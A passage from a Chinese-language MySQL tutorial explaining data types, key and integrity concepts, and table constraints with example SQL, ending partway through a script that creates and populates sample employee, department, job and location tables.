12345678901.12, 12345678901);\n# decimal的默认值(10, 0)表示会将小数位全部舍弃，但还是会按照四舍五入进行舍弃\ninsert into tab_float2 values(12.34, 12345678901.12, 1234567890.1);\nselect * from tab_float2;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 字符型\n\n * 较短的文本：\n   * char(m)，固定长度的字符串，最大长度不能超过m，其中m可以省略，默认为1。m为0~255之间的整数。\n   * varchar(m)，可变长度的字符串，最大长度不能超过m，其中m不可以省略。m为0~65535之间的整数。\n   * binary(m)，只包含二进制字符，固定字节数的字符串，最大字节数不能超过m，其中m可以省略，默认为1。m为0~255之间的整数。\n   * varbinary(m)，只包含二进制字符，可变字节数的字符串，最大字节数不能超过m，m为0~65535之间的整数。\n   * enum，枚举型，只能插入枚举列表里的其中一个字符。枚举列表最多有65535个成员。\n   * set，集合型，和枚举型有些像，但它的列表最多64个成员，使用它的时候可以取多个成员进行插入。\n * 较长的普通文本：\n   * tinytext，文本的字符长度是0 ~ 255。（2^8-1）\n   * text，文本的字符长度是0 ~ 65535。（2^16-1）\n   * mediumtext，文本的字符长度是0 ~ 1677215。（2^24-1）\n   * longtext，文本的字符长度是0 ~ 4294967295。（2^32-1）\n * 较长的二进制文本：\n   * tinyblob，二进制文本的字节数是0 ~ 255。（2^8-1）\n   * blob，二进制文本的字节数是0 ~ 65535。（2^16-1）\n   * mediumblob，二进制文本的字节数是0 ~ 1677215。（2^24-1）\n   * longblob，二进制文本的字节数是0 ~ 4294967295。（2^32-1）\n\n较短文本的特点：\n\n * char比较消耗存储空间，但是效率高。长度绝对固定的就用它。binary与它类似。\n * varchar比较节省存储空间，但效率低。长度不确定的就用它。varbinary于它类似。\n\ndrop table if exists tab_char;\ncreate table tab_char (\n  c1 char(3)\n);\ndesc tab_char;\n# 插入字符数超过了3，所以报错。这跟整型的显示长度是不一样的。\ninsert into tab_char values('abcd');\ninsert into tab_char values('abc');\nselect * from tab_char;\n# 新增c2列，类型为varchar(5)\nalter table tab_char add column c2 varchar(5);\n# 插入字符数超过了5，所以报错。\ninsert into tab_char values('abc', 'abcdef');\ninsert into tab_char values('abc', 'abcde');\nselect * from tab_char;\n# 新增c3列，类型为binary，默认字节数为1\nalter table tab_char add column c3 binary;\n# 字节数超过1，所以报错\ninsert into tab_char values('abc', 'abcde', 'ab');\ninsert into tab_char values('abc', 'abcde', 'a');\nselect * from tab_char;\n# 新增c4列，类型为varbinary(6)\nalter table tab_char add column c4 varbinary(6);\n# 字节数超过6，所以报错\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdefg');\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdef');\nselect * from tab_char;\n# 新增c5列，类型为enum('a', 'c', 'd')\nalter table tab_char add column c5 enum('a', 'c', 'd');\n# e不在枚举列表中，所以报错\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdef', 'e');\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdef', 'd');\nselect * from tab_char;\n# 新增c6列，类型为set('a', 'b', 'c')\nalter table tab_char add column c6 set('a', 'b', 'c');\n# d不在集合列表中，所以报错\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdef', 'd', 'd');\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdef', 'd', 'a');\n# 可以组合使用set列表中的值，用逗号隔开，但是不能有空格\ninsert into tab_char values('abc', 'abcde', 'a', 'abcdef', 'd', 'b,c');\nselect * from tab_char;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n较长文本特点：可以将blob视为可以随心所欲扩大的varbinary。同样，可以将text视为可以随心所欲扩大的varchar。\n\n\n# 日期型\n\n日期型有如下几种：\n\n * date：格式是yyyy-mm-dd，范围是1000-01-01到9999-12-31。\n * datetime：格式是yyyy-mm-dd hh:mm:ss，范围是1000-01-01 00:00:00到9999-12-31 23:59:59。\n * timestamp：格式是yyyy-mm-dd hh:mm:ss，范围是utc1970-01-01 00:00:01到utc2038-01-19 03:14:07。\n * time：格式是hh:mm:ss，范围是-838:59:59，最大值838:59:59。带冒号的11:12意味着11:12:00，没带冒号的1112意味着00:11:12。\n * year：格式是yyyy，范围是1901到2155。\n\n日期型特点：\n\n * date只保存日期，time只保存时间，year只保存年份，datetime和timestamp保存日期+时间。\n * datetime的范围比timestamp要大，但是timestamp的保存和时区（time_zone）有关。\n\ndrop table if exists tab_date;\ncreate table tab_date (\n  d1 year,\n  d2 date,\n  d3 time,\n  d4 datetime,\n  d5 timestamp\n);\ninsert into tab_date values (now(), now(), now(), now(), now());\nshow variables like 'time_zone';\nselect * from tab_date;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 常见约束和自增长列\n\n\n# 一些概念\n\n 1. 超键(super key)：在关系中能唯一标识元组的属性集。“关系”是一张表；“元组”是表中的每行；“属性集”是单个属性或一组属性；每列就是一个属性。（超键包含主键和候选键）\n 2. 候选键(candidate key)：如果一个属性集能唯一标识元组，且有不包含多余属性，那么这个属性集称为候选键。（也称最小超键，所以说超键包含候选键）\n 3. 主键(primary key)：关系模式中用户正在使用的候选键称主键（真正被选来标识元组的候选键）。\n    * 单主键：非空+唯一键值的一列做主键，优点是操作方便，缺点是可能没有具体含义。（没有含义的主键常称为逻辑主键，有含义的是业务主键）\n    * 复合主键(compound primary key)：也叫做联合主键。多个列并列作为主键，优点是键值大多都有含义并会提高查询速度，缺点就是使用不太方便并且会降低了插入、删除、更新表的速度。\n 4. 外键(foreign key)：将一个表的值放入第二个表来表示关联，所使用的值是第一个表的主键值（在必要时可包括复合主键值）。此时，第二个表中保存这些值的属性称为外键，第一个表称为主表，第二个表称为从表。外键不一定要与相应的主键同名，比如在学生（学号，姓名，性别，班长）关系中，“学号”是主键，“班长”属性表示该学生所在班级的班长的学号，它引用了本关系中“学号”属性，因此“班长”是外键。\n 5. 数据库完整性(database integrity)：是指数据库中数据在逻辑上的一致性、正确性、有效性和相容性。\n    * 实体完整性(entity integrity)：指表中行的完整性。要求每个数据表都必须有主键，而作为主键的所有字段，其值必须是不重复且非空值。（实体是指一行数据或一条记录，表中不能存在完全相同的记录）\n    * 参照完整性(referential integrity)：也叫做引用完整性，用来规定主从表的引用规则。外键列值要非空值，如果要删除被引用的对象，那么也要删除引用它的所有对象，或者把引用值设置为空(如果允许的话)。例如，学生和班级关系中，外键“班级编号”的值不能为空，并且删除班级表中某个班级元组之前，必须先删除学生表中对应引用该班级的学生元组。\n    * 用户定义完整性(user-defined integrity)：也叫做域完整性，是对数据表中字段属性的约束。包括字段的值域、字段的类型和字段的有效规则（如小数位数）等约束。\n 6. 约束：对数据表中某些列的进行按照约定（特定）条件作出限制，为了保证表中的数据的准确性和可靠性。\n    * 主键约束(primary key constraint)：要求主键列数据唯一，并且不允许为空。\n    * 外键约束(foreign key constraint)：用于在两个表之间建立关系，需要指定引用主表的哪一列。\n    * 唯一约束(unique constraint)：要求该列唯一，允许为空，但只能出现一个空值。\n    * 检查约束(check constraint)：某列取值范围限制，格式限制等，如有关年龄、邮箱（必须有@）的约束。\n    * 默认约束(default constraint)：某列的默认值，如在数据库里有一项数据很多重复，可以设为默认值。\n    * 非空约束(not null constraint)：某列的默认值，列数据的值不能为空，得是必填的。\n 7. mysql8.0.16之前是检查约束在语法上是支持的并且也会解析，但数据库引擎不会执行这个功能，mysql8.0.16之前是可以搭配“触发器”来实现的检查功能的。mysql8.0.16之后就能使用它，并且语法和数据库引擎都支持它。\n\n\n# 主键约束\n\n主键约束让表的某列作为一个主要使用的唯一标识（一个表只能有一个主键），让每一行的数据是独一无二的（不可能存在相同主键值的两行数据）。\n\n列级约束是直接在列定义后面加上约束，而表级约束是在所有列定义完后加上约束。表级约束定义时可以使用多个候选键形成一个联合主键（复合主键），这适用于没引入无意义id时的场景。\n列级主键约束：列名 列的类型 primary key。\n表级主键约束：[constraint [约束名]] primary key (列名[,列名...])，[]内容表示可以省略。\n\n表创建时没有加上主键约束，那可以在创建后使用alter table 表名 add primary key(列名)来添加，还可以使用alter table 表名 modify column 列名 列的类型 primary key，甚至使用alter table 表名 change column 旧列名 新列名 列的类型 primary key。\n\n删除主键就简单了，只需要alter table 表名 drop primary key即可。（alter table 表名 modify column 列名 列的类型和alter table 表名 change column 旧列名 新列名 列的类型这两种删除方式是无效的）\n\ndrop table if exists tab_primary;\n# 列级主键约束\ncreate table tab_primary(\n  id int primary key,\n  name varchar(12)\n);\ndesc tab_primary;\nshow create table tab_primary;\ninsert into tab_primary values(1, '张三');\n# 不允许出现相同的主键值\ninsert into tab_primary values(1, '李四');\nselect * from tab_primary;\ndrop table if exists tab_primary2;\n# 表级主键约束，有三种写法\ncreate table tab_primary2(\n  id int,\n  name varchar(12),\n  primary key (id)                       # 省略了“constraint 约束名”\n  # constraint primary key (id)         # 省略了约束名\n  # constraint pri_key primary key (id) # 完整写法\n);\ndesc tab_primary2;\nshow create table tab_primary2;\ninsert into tab_primary2 values(1, '张三');\ninsert into tab_primary2 values(2, '李四');\nselect * from tab_primary2;\ndrop table if exists tab_primary3;\n# 搭配alter来使用主键约束\ncreate table tab_primary3(\n  id int,\n  name varchar(12)\n);\nshow create table tab_primary3;\n# 添加主键约束\nalter table tab_primary3 add primary key(id);\n# 添加主键约束（要带上类型），modify方式修改主键约束很少用\nalter table tab_primary3 modify column id int primary key;\n# 添加主键约束（要带上类型），change式修改主键约束很少用\nalter table tab_primary3 change column id id int primary key;\n# 删除主键约束（无论表级还是列级），因为主键只有一个所以省略了列名\nalter table tab_primary3 drop primary key;\n# alter table tab_primary3 modify column id int; # 该方法删除主键无效\n# alter table tab_primary3 change column id id int; # 该方法删除主键无效\ndesc tab_primary3;\ndrop table if exists tab_primary4;\n# 联合主键\ncreate table tab_primary4(\n  name varchar(12),\n  boid int,\n  soid int,\n  primary key (boid, soid)\n);\n# 删除联合主键，这个和单主键一样的写法\nalter table tab_primary4 drop primary key;\n# 再次添加联合主键，这个和单主键一样的写法，只是括号里多了一个\nalter table tab_primary4 add primary key(boid, soid);\ndesc tab_primary4;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n主键约束与唯一约束异同点：\n\n * 它们基本都能保证数据的唯一性。\n * 主键约束所在列的值不能为空，而唯一约束所在列的值可以为空。（“空”不等于“空”，所以在一定意义上保证了唯一性）\n * 主键约束至多有一个，即使是联合主键（复合主键）也只是联合在一起，形成一个主键；唯一约束可以有多个，也能联合。\n\n\n# 外键约束\n\n外键约束定义在从表里，用来关联主表的，在加外键约束时主表必须存在。它的写法只有表级外键约束：[constraint [约束名]] foreign key (列名[,列名...]) references 主表名(列名[,列名...])，[]内容表示可以省略。\n\n表创建时没有加上外键约束，那可以在创建后使用alter table 从表名 add foreign key(列名) references 主表名(列名)来添加。\n\n外键约束的删除是alter table 表名 drop foreign key 约束名，约束名必须通过show create table 表名进行查询。\n\n# 主表必须存在\ncreate table tab_parent(\n  id int primary key,\n  name varchar(10)\n);\ncreate table tab_child(\n  id int primary key,\n  parentid int,\n  name varchar(10),\n  # 外键约束的简便写法\n  foreign key (parentid) references tab_parent(id)\n);\n# 查看“create table”里的外键信息\nshow create table tab_child;\ndrop table if exists tab_child2;\ncreate table tab_child2(\n  id int primary key,\n  parentid int,\n  name varchar(10)\n);\n# 表创建后再加外键约束\nalter table tab_child2 add foreign key (parentid) references tab_parent(id);\nshow create table tab_child2;\n# 删除时必须先使用show create table查到外键约束名，查到是tab_child2_ibfk_1\nalter table tab_child2 drop foreign key tab_child2_ibfk_1;\n# 先删从表再删主表\ndrop table if exists tab_child;\ndrop table if exists tab_child2;\ndrop table if exists tab_parent;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 唯一\\检查\\默认\\非空约束\n\n默认约束和非空约束只支持列级约束，唯一约束和检查约束是列级约束和表级约束都支持。\n\n表创建时添加约束\n\ncreate table 表名(\n  列名1 列的类型 unique,          # 唯一约束\n  列名2 列的类型 check(exp),      # 检查约束，exp是检查表达式，表达式包含了列2\n  列名3 列的类型 default value,   # 默认约束，value就是默认值\n  列名4 列的类型 not null         # 非空约束\n);\ncreate table 表名(\n  列名1 列的类型,\n  列名2 列的类型,\n  列名3 列的类型 default value,     # 默认约束，value就是默认值\n  列名4 列的类型 not null,          # 非空约束\n  unique(列名1),                   # 唯一约束\n  check(exp)                       # 检查约束，exp是检查表达式，表达式包含了列2\n);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n表创建后添加/删除这些约束：\n\n * 非空约束和默认约束的添加：alter table 表名 modify column 列名 列的类型 约束或者alter table 表名 change column 旧列名 新列名 列的类型 约束。\n * 非空约束和默认约束的删除：alter table 表名 modify column 列名 列的类型或者alter table 表名 change column 旧列名 新列名 列的类型。\n * 检查约束的添加：alter table 表名 add check约束。\n * 检查约束的删除：alter table 表名 drop check 约束名，这个约束名得通过show create table 表名进行查询。\n * 唯一约束的添加：alter table 表名 add unique(列名)。\n * 唯一约束的删除：alter table 表名 drop index 列名。\n\ndrop table if exists tab_constraint;\ncreate table tab_constraint(\n  id int primary key,                              # 主键约束\n  name varchar(10) not null,                      # 非空约束\n  gender char check(gender='男' or gender='女'),   # 检查约束\n  seat int unique,                                # 唯一约束\n  age int default 18                              # 默认约束\n  # check(gender='男' or gender='女')             # 表级检查约束\n);\n# 验证age的默认约束是否生效\ninsert into tab_constraint (id,name,gender,seat) values(0, '张三', '男', 1);\n# 验证seat的唯一约束是否生效\ninsert into tab_constraint (id,name,gender,seat) values(1, '李四', '男', 1);\ninsert into tab_constraint (id,name,gender,seat) values(1, '李四', '男', 2);\n# 验证gender的检查约束是否生效\ninsert into tab_constraint (id,name,gender,seat) values(2, '王五', '无', 3);\ninsert into tab_constraint (id,name,gender,seat) values(2, '王五', '女', 3);\n# 验证name的非空约束是否生效\ninsert into tab_constraint (id,name,gender,seat) values(3, null, '女', 4);\ninsert into tab_constraint (id,name,gender,seat) values(3, '赵六', '女', 4);\nselect * from tab_constraint;\ndrop table if exists tab_constraint2;\n# 唯一约束和检查约束支持表级\ncreate table tab_constraint2(\n  id int,\n  name varchar(10) not null,\n  gender char,\n  seat int,\n  age int default 18,\n  primary key(id),\n  check(gender='男' or gender='女'),\n  unique(seat)\n);\nshow create table tab_constraint2;\n# 删除name的非空约束（modify方式删除非空约束）\nalter table tab_constraint2 modify column name varchar(10);\n# 重新增加name的非空约束（modify方式增加非空约束）\nalter table tab_constraint2 modify column name varchar(10) not null;\n# 重新删除name的非空约束（change方式删除非空约束）\nalter table tab_constraint2 change column name name varchar(10);\n# 再重新增加name的非空约束（change方式增加非空约束）\nalter table tab_constraint2 change column name name varchar(10) not null;\n# 删除gender的检查约束，这里删除就别使用modify或change方式了\nalter table tab_constraint2 drop check tab_constraint2_chk_1;\n# 重新增加gender的检查约束，这里增加就别使用modify或change方式了\nalter table tab_constraint2 add check(gender='男' or gender='女');\n# 删除seat的唯一约束，这里删除就别使用modify或change方式了\nalter table tab_constraint2 drop index seat;\n# 重新增加seat的唯一约束，这里增加就别使用modify或change方式了\nalter table tab_constraint2 add unique(seat);\n# 删除age的默认约束（modify方式删除默认约束）\nalter table tab_constraint2 modify column age int;\n# 重新增加age的默认约束（modify方式增加默认约束）\nalter table tab_constraint2 modify column age int default 18;\n# 重新删除age的默认约束（change方式删除默认约束）\nalter table tab_constraint2 change column age age int;\n# 再重新增加age的默认约束（change方式增加默认约束）\nalter table tab_constraint2 change column age age int default 18;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n\n\n# 自增长列\n\n自增长列又称为标识列，它可以不手动的插入值，系统提供默认的序列值。写法：列名 列的类型 列的约束 auto_increment。\n\ndrop table if exists tab_increment;\ncreate table tab_increment(\n  id int primary key auto_increment,\n  name varchar(20)\n);\ninsert into tab_increment values(null, '张三');\ninsert into tab_increment values(null, '李四');\ninsert into tab_increment values(null, '王五');\ninsert into tab_increment (name) values('赵六');\nselect * from tab_increment;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 新建员工相关表的sql\n\ndrop table if exists `employees`;\ndrop table if exists `departments`;\ndrop table if exists `locations`;\ndrop table if exists `jobs`;\n\n# 建locations表\ncreate table `locations` (\n  `location_id` int(11) not null auto_increment comment '位置编号',\n  `street_address` varchar(40) comment '街道',\n  `postal_code` varchar(12) comment '邮编',\n  `city` varchar(30) comment '城市',\n  `state_province` varchar(25) comment '州/省',\n  `country_id` varchar(2) comment '国家编号',\n  primary key (`location_id`)\n) comment '位置表';\n\n# 建departments表\ncreate table `departments` (\n  `department_id` int(4) not null auto_increment comment '部门编号',\n  `department_name` varchar(3) comment '部门名称',\n  `manager_id` int(6) comment '部门领导的员工编号',\n  `location_id` int(4) comment '位置编号',\n  primary key (`department_id`),\n  constraint `loc_id_fk` foreign key (`location_id`) references `locations` (`location_id`)\n) comment '部门表';\n\n# 建jobs表\ncreate table `jobs` (\n  `job_id` varchar(10) not null comment '工种编号',\n  `job_title` varchar(35) comment '工种名称',\n  `min_salary` int(6) comment '最低薪酬',\n  `max_salary` int(6) comment '最高薪酬',\n  primary key (`job_id`)\n) comment '工种表';\n\n# 建employees表\ncreate table `employees` (\n  `employee_id` int(6) not null auto_increment comment '员工编号',\n  `first_name` varchar(20) comment '名',\n  `last_name` varchar(25) comment '姓',\n  `email` varchar(25) comment '邮箱',\n  `phone_number` varchar(20) comment '电话号码',\n  `job_id` varchar(10) comment '工种编号',\n  `salary` double(10,2) comment '月薪',\n  `commission_pct` double(4,2) comment '奖金率',\n  `manager_id` int(6) comment '上级领导的员工编号',\n  `department_id` int(4) comment '部门编号',\n  `hiredate` datetime comment '入职时间',\n  primary key (`employee_id`),\n  constraint `dept_id_fk` foreign key (`department_id`) references `departments` (`department_id`),\n  constraint `job_id_fk` foreign key (`job_id`) references `jobs` (`job_id`)\n) comment '员工表';\n\n# 向locations表插入数据\ninsert into `locations`(`location_id`,`street_address`,`postal_code`,`city`,`state_province`,`country_id`) values\n(1000,'1297 via cola di rie','00989','roma',null,'it'),\n(1100,'93091 calle della testa','10934','venice',null,'it'),\n(1200,'2017 shinjuku-ku','1689','tokyo','tokyo prefecture','jp'),\n(1300,'9450 kamiya-cho','6823','hiroshima',null,'jp'),\n(1400,'2014 jabberwocky rd','26192','southlake','texas','us'),\n(1500,'2011 interiors blvd','99236','south san francisco','california','us'),\n(1600,'2007 zagora st','50090','south brunswick','new jersey','us'),\n(1700,'2004 charade rd','98199','seattle','washington','us'),\n(1800,'147 spadina ave','m5v 2l7','toronto','ontario','ca'),\n(1900,'6092 boxwood st','ysw 9t2','whitehorse','yukon','ca'),\n(2000,'40-5-12 laogianggen','190518','beijing',null,'cn'),\n(2100,'1298 vileparle (e)','490231','bombay','maharashtra','in'),\n(2200,'12-98 victoria street','2901','sydney','new south wales','au'),\n(2300,'198 clementi north','540198','singapore',null,'sg'),\n(2400,'8204 arthur st',null,'london',null,'uk'),\n(2500,'magdalen centre, the oxford science park','ox9 9zb','oxford','oxford','uk'),\n(2600,'9702 chester road','09629850293','stretford','manchester','uk'),\n(2700,'schwanthalerstr. 7031','80925','munich','bavaria','de'),\n(2800,'rua frei caneca 1360 ','01307-002','sao paulo','sao paulo','br'),\n(2900,'20 rue des corps-saints','1730','geneva','geneve','ch'),\n(3000,'murtenstrasse 921','3095','bern','be','ch'),\n(3100,'pieter breughelstraat 837','3029sk','utrecht','utrecht','nl'),\n(3200,'mariano escobedo 9991','11932','mexico city','distrito federal,','mx');\n\n# 向departments表插入数据\ninsert into `departments`(`department_id`,`department_name`,`manager_id`,`location_id`) values\n(10,'adm',200,1700),(20,'mar',201,1800),(30,'pur',114,1700),(40,'hum',203,2400),\n(50,'shi',121,1500),(60,'it',103,1400),(70,'pub',204,2700),(80,'sal',145,2500),\n(90,'exe',100,1700),(100,'fin',108,1700),(110,'acc',205,1700),(120,'tre',null,1700),\n(130,'cor',null,1700),(140,'con',null,1700),(150,'sha',null,1700),(160,'ben',null,1700),\n(170,'man',null,1700),(180,'con',null,1700),(190,'con',null,1700),(200,'ope',null,1700),\n(210,'it ',null,1700),(220,'noc',null,1700),(230,'it ',null,1700),(240,'gov',null,1700),\n(250,'ret',null,1700),(260,'rec',null,1700),(270,'pay',null,1700);\n\n# 向jobs表插入数据\ninsert into `jobs`(`job_id`,`job_title`,`min_salary`,`max_salary`) values\n('ac_account','public accountant',4200,9000),('ac_mgr','accounting manager',8200,16000),\n('ad_asst','administration assistant',3000,6000),('ad_pres','president',20000,40000),\n('ad_vp','administration vice president',15000,30000),('fi_account','accountant',4200,9000),\n('fi_mgr','finance manager',8200,16000),('hr_rep','human resources representative',4000,9000),\n('it_prog','programmer',4000,10000),('mk_man','marketing manager',9000,15000),\n('mk_rep','marketing representative',4000,9000),('pr_rep','public relations representative',4500,10500),\n('pu_clerk','purchasing clerk',2500,5500),('pu_man','purchasing manager',8000,15000),\n('sa_man','sales manager',10000,20000),('sa_rep','sales representative',6000,12000),\n('sh_clerk','shipping clerk',2500,5500),('st_clerk','stock clerk',2000,5000),\n('st_man','stock manager',5500,8500);\n\n# 向employees表插入数据\ninsert into `employees`(`employee_id`,`first_name`,`last_name`,`email`,`phone_number`,`job_id`,`salary`,\n`commission_pct`,`manager_id`,`department_id`,`hiredate`) values\n(100,'steven','k_ing','sking','515.123.4567','ad_pres',24000.00,null,null,90,'1992-04-03 00:00:00'),\n(101,'neena','kochhar','nkochhar','515.123.4568','ad_vp',17000.00,null,100,90,'1992-04-03 00:00:00'),\n(102,'lex','de haan','ldehaan','515.123.4569','ad_vp',17000.00,null,100,90,'1992-04-03 00:00:00'),\n(103,'alexander','hunold','ahunold','590.423.4567','it_prog',9000.00,null,102,60,'1992-04-03 00:00:00'),\n(104,'bruce','ernst','bernst','590.423.4568','it_prog',6000.00,null,103,60,'1992-04-03 00:00:00'),\n(105,'david','austin','daustin','590.423.4569','it_prog',4800.00,null,103,60,'1998-03-03 00:00:00'),\n(106,'valli','pataballa','vpatabal','590.423.4560','it_prog',4800.00,null,103,60,'1998-03-03 00:00:00'),\n(107,'diana','lorentz','dlorentz','590.423.5567','it_prog',4200.00,null,103,60,'1998-03-03 00:00:00'),\n(108,'nancy','greenberg','ngreenbe','515.124.4569','fi_mgr',12000.00,null,101,100,'1998-03-03 00:00:00'),\n(109,'daniel','faviet','dfaviet','515.124.4169','fi_account',9000.00,null,108,100,'1998-03-03 00:00:00'),\n(110,'john','chen','jchen','515.124.4269','fi_account',8200.00,null,108,100,'2000-09-09 00:00:00'),\n(111,'ismael','sciarra','isciarra','515.124.4369','fi_account',7700.00,null,108,100,'2000-09-09 00:00:00'),\n(112,'jose manuel','urman','jmurman','515.124.4469','fi_account',7800.00,null,108,100,'2000-09-09 00:00:00'),\n(113,'luis','popp','lpopp','515.124.4567','fi_account',6900.00,null,108,100,'2000-09-09 00:00:00'),\n(114,'den','raphaely','drapheal','515.127.4561','pu_man',11000.00,null,100,30,'2000-09-09 00:00:00'),\n(115,'alexander','khoo','akhoo','515.127.4562','pu_clerk',3100.00,null,114,30,'2000-09-09 00:00:00'),\n(116,'shelli','baida','sbaida','515.127.4563','pu_clerk',2900.00,null,114,30,'2000-09-09 00:00:00'),\n(117,'sigal','tobias','stobias','515.127.4564','pu_clerk',2800.00,null,114,30,'2000-09-09 00:00:00'),\n(118,'guy','himuro','ghimuro','515.127.4565','pu_clerk',2600.00,null,114,30,'2000-09-09 00:00:00'),\n(119,'karen','colmenares','kcolmena','515.127.4566','pu_clerk',2500.00,null,114,30,'2000-09-09 00:00:00'),\n(120,'matthew','weiss','mweiss','650.123.1234','st_man',8000.00,null,100,50,'2004-02-06 00:00:00'),\n(121,'adam','fripp','afripp','650.123.2234','st_man',8200.00,null,100,50,'2004-02-06 00:00:00'),\n(122,'payam','kaufling','pkauflin','650.123.3234','st_man',7900.00,null,100,50,'2004-02-06 00:00:00'),\n(123,'shanta','vollman','svollman','650.123.4234','st_man',6500.00,null,100,50,'2004-02-06 00:00:00'),\n(124,'kevin','mourgos','kmourgos','650.123.5234','st_man',5800.00,null,100,50,'2004-02-06 00:00:00'),\n(125,'julia','nayer','jnayer','650.124.1214','st_clerk',3200.00,null,120,50,'2004-02-06 00:00:00'),\n(126,'irene','mikkilineni','imikkili','650.124.1224','st_clerk',2700.00,null,120,50,'2004-02-06 00:00:00'),\n(127,'james','landry','jlandry','650.124.1334','st_clerk',2400.00,null,120,50,'2004-02-06 00:00:00'),\n(128,'steven','markle','smarkle','650.124.1434','st_clerk',2200.00,null,120,50,'2004-02-06 00:00:00'),\n(129,'laura','bissot','lbissot','650.124.5234','st_clerk',3300.00,null,121,50,'2004-02-06 00:00:00'),\n(130,'mozhe','atkinson','matkinso','650.124.6234','st_clerk',2800.00,null,121,50,'2004-02-06 00:00:00'),\n(131,'james','marlow','jamrlow','650.124.7234','st_clerk',2500.00,null,121,50,'2004-02-06 00:00:00'),\n(132,'tj','olson','tjolson','650.124.8234','st_clerk',2100.00,null,121,50,'2004-02-06 00:00:00'),\n(133,'jason','mallin','jmallin','650.127.1934','st_clerk',3300.00,null,122,50,'2004-02-06 00:00:00'),\n(134,'michael','rogers','mrogers','650.127.1834','st_clerk',2900.00,null,122,50,'2002-12-23 00:00:00'),\n(135,'ki','gee','kgee','650.127.1734','st_clerk',2400.00,null,122,50,'2002-12-23 00:00:00'),\n(136,'hazel','philtanker','hphiltan','650.127.1634','st_clerk',2200.00,null,122,50,'2002-12-23 00:00:00'),\n(137,'renske','ladwig','rladwig','650.121.1234','st_clerk',3600.00,null,123,50,'2002-12-23 00:00:00'),\n(138,'stephen','stiles','sstiles','650.121.2034','st_clerk',3200.00,null,123,50,'2002-12-23 00:00:00'),\n(139,'john','seo','jseo','650.121.2019','st_clerk',2700.00,null,123,50,'2002-12-23 00:00:00'),\n(140,'joshua','patel','jpatel','650.121.1834','st_clerk',2500.00,null,123,50,'2002-12-23 00:00:00'),\n(141,'trenna','rajs','trajs','650.121.8009','st_clerk',3500.00,null,124,50,'2002-12-23 00:00:00'),\n(142,'curtis','davies','cdavies','650.121.2994','st_clerk',3100.00,null,124,50,'2002-12-23 00:00:00'),\n(143,'randall','matos','rmatos','650.121.2874','st_clerk',2600.00,null,124,50,'2002-12-23 00:00:00'),\n(144,'peter','vargas','pvargas','650.121.2004','st_clerk',2500.00,null,124,50,'2002-12-23 00:00:00'),\n(145,'john','russell','jrussel','011.44.1344.429268','sa_man',14000.00,0.40,100,80,'2002-12-23 00:00:00'),\n(146,'karen','partners','kpartner','011.44.1344.467268','sa_man',13500.00,0.30,100,80,'2002-12-23 00:00:00'),\n(147,'alberto','errazuriz','aerrazur','011.44.1344.429278','sa_man',12000.00,0.30,100,80,'2002-12-23 00:00:00'),\n(148,'gerald','cambrault','gcambrau','011.44.1344.619268','sa_man',11000.00,0.30,100,80,'2002-12-23 00:00:00'),\n(149,'eleni','zlotkey','ezlotkey','011.44.1344.429018','sa_man',10500.00,0.20,100,80,'2002-12-23 00:00:00'),\n(150,'peter','tucker','ptucker','011.44.1344.129268','sa_rep',10000.00,0.30,145,80,'2014-03-05 00:00:00'),\n(151,'david','bernstein','dbernste','011.44.1344.345268','sa_rep',9500.00,0.25,145,80,'2014-03-05 00:00:00'),\n(152,'peter','hall','phall','011.44.1344.478968','sa_rep',9000.00,0.25,145,80,'2014-03-05 00:00:00'),\n(153,'christopher','olsen','colsen','011.44.1344.498718','sa_rep',8000.00,0.20,145,80,'2014-03-05 00:00:00'),\n(154,'nanette','cambrault','ncambrau','011.44.1344.987668','sa_rep',7500.00,0.20,145,80,'2014-03-05 00:00:00'),\n(155,'oliver','tuvault','otuvault','011.44.1344.486508','sa_rep',7000.00,0.15,145,80,'2014-03-05 00:00:00'),\n(156,'janette','k_ing','jking','011.44.1345.429268','sa_rep',10000.00,0.35,146,80,'2014-03-05 00:00:00'),\n(157,'patrick','sully','psully','011.44.1345.929268','sa_rep',9500.00,0.35,146,80,'2014-03-05 00:00:00'),\n(158,'allan','mcewen','amcewen','011.44.1345.829268','sa_rep',9000.00,0.35,146,80,'2014-03-05 00:00:00'),\n(159,'lindsey','smith','lsmith','011.44.1345.729268','sa_rep',8000.00,0.30,146,80,'2014-03-05 00:00:00'),\n(160,'louise','doran','ldoran','011.44.1345.629268','sa_rep',7500.00,0.30,146,80,'2014-03-05 00:00:00'),\n(161,'sarath','sewall','ssewall','011.44.1345.529268','sa_rep',7000.00,0.25,146,80,'2014-03-05 00:00:00'),\n(162,'clara','vishney','cvishney','011.44.1346.129268','sa_rep',10500.00,0.25,147,80,'2014-03-05 00:00:00'),\n(163,'danielle','greene','dgreene','011.44.1346.229268','sa_rep',9500.00,0.15,147,80,'2014-03-05 